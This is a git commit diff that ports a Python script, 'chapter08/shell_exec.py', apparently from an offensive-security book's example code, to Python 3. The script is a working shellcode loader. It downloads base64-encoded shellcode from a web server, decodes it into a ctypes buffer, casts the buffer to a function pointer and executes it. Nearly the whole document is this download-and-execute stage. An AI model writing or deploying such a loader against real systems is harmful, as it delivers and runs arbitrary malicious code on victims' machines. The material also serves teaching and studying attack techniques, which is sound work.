e1892fdf8aafe3e9c1cdfe2f6f32b92ecbf747b5
EONRaider <livewire_voodoo@protonmail.com>
2020-05-09 17:48:16 -0300

    Convert to to Python 3 and add to source code

--- chapter08/shell_exec.py
+++ chapter08/shell_exec.py
@@ -1,10 +1,10 @@
-import urllib2
-import ctypes
 import base64
+import ctypes
+import urllib.request
 
 # retrieve the shellcode from our web server
 url = "http://localhost:8000/shellcode.bin"
-response = urllib2.urlopen(url)
+response = urllib.request.urlopen(url)
 
 # decode the shellcode from base64 
 shellcode = base64.b64decode(response.read())
@@ -13,7 +13,8 @@ shellcode = base64.b64decode(response.read())
 shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
 
 # create a function pointer to our shellcode
-shellcode_func   = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
+shellcode_func = ctypes.cast(shellcode_buffer,
+                             ctypes.CFUNCTYPE(ctypes.c_void_p))
 
 # call our shellcode
 shellcode_func()
